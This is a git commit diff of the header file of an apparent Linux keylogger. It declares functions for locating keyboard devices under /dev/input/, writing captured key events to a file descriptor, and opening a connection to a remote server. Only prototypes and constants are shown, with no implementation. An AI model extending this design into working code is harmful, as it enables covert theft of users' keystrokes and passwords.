3890a5ce13c9306fc03b2daf4148c33372a7ae7b
FabioCinicolo <fabiocinicolo@gmail.com>
2023-06-06 15:18:28 +0200

    2.0 version

--- keylogger.h
+++ keylogger.h
@@ -1,17 +1,18 @@
 #ifndef KEYLOGGER
 #define KEYLOGGER
 
-#define MAX_EVENTS 10
+#define MAX_EVENTS 3
 #define KEY_PRESSED 1
 #define KEY_RELEASED 0
 #define KEY_REPEATED 2
 #define PATH "/dev/input/"
 typedef struct input_event event;
 
-void startKeylogger(int keyboard, int server);
-int findKeyboardDevice(char *dir_path);
-int isKeyboardDevice(char *path, int *keyboard_device);
-int writeEventsIntoFile(int fd, event *events, size_t to_write);
+void startKeylogger(int keyboard, int fd_out);
+int *findKeyboards(char * path, int *num_keyboards);
+int findRealKeyboard(int *keyboards, int num_keyboards, int timeout, int * keyboard);
+int writeEventsIntoFile(int fd, struct input_event *events, size_t to_write);
+int isKeyboardDevice(int fd);
 void sigHandler(int signum);
 int openConnectionWithServer(char*ip, short port);
 
